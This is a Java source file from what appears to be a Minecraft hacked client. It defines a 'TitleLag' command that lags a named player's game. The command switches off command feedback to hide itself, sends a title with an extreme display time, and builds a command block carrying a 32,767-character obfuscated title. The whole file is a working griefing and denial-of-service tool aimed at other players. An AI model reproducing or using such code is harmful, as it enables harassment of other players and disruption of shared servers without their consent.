/*
 * Copyright (c) 2022 Coffee client, 0x150 and contributors. See copyright file in project root.
 */

package coffee.client.feature.command.impl;

import coffee.client.CoffeeMain;
import coffee.client.feature.command.Command;
import coffee.client.feature.command.argument.PlayerFromNameArgumentParser;
import coffee.client.feature.command.coloring.ArgumentType;
import coffee.client.feature.command.coloring.PossibleArgument;
import coffee.client.feature.command.coloring.StaticArgumentServer;
import coffee.client.feature.command.exception.CommandException;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

import java.util.Objects;

public class TitleLag extends Command {
    public TitleLag() {
        super("TitleLag", "Lag players with big ass titles", "lag", "titleLag");
    }

    @Override
    public PossibleArgument getSuggestionsWithType(int index, String[] args) {
        return StaticArgumentServer.serveFromStatic(index, new PossibleArgument(ArgumentType.PLAYER, Objects.requireNonNull(CoffeeMain.client.world)
                .getPlayers()
                .stream()
                .map(abstractClientPlayerEntity -> abstractClientPlayerEntity.getGameProfile().getName())
                .toList()
                .toArray(String[]::new)));
    }

    @Override
    public void onExecute(String[] args) throws CommandException {
        validateArgumentsLength(args, 1, "Provide target player");
        PlayerEntity target = new PlayerFromNameArgumentParser(true).parse(args[0]);
        String targetName = target.getGameProfile().getName();
        CoffeeMain.client.getNetworkHandler()
                .sendPacket(new ChatMessageC2SPacket("/gamerule sendCommandFeedback false"));
        CoffeeMain.client.getNetworkHandler()
                .sendPacket(new ChatMessageC2SPacket("/title " + targetName + " times 0 999999999 0"));
        CoffeeMain.client.getNetworkHandler()
                .sendPacket(new ChatMessageC2SPacket("/gamerule sendCommandFeedback true"));
        ItemStack stack = new ItemStack(Items.COMMAND_BLOCK, 1);
        try {
            stack.setNbt(StringNbtReader.parse("{BlockEntityTag:{Command:\"/title " + targetName + " title {\\\"text\\\":\\\"" + "l".repeat(32767) + "\\\",\\\"obfuscated\\\":true}\",powered:0b,auto:1b,conditionMet:1b}}"));
        } catch (Exception e) {
            e.printStackTrace();
        }
        CoffeeMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + CoffeeMain.client.player.getInventory().selectedSlot, stack));
        message("Place the command block to keep lagging the player");
    }
}
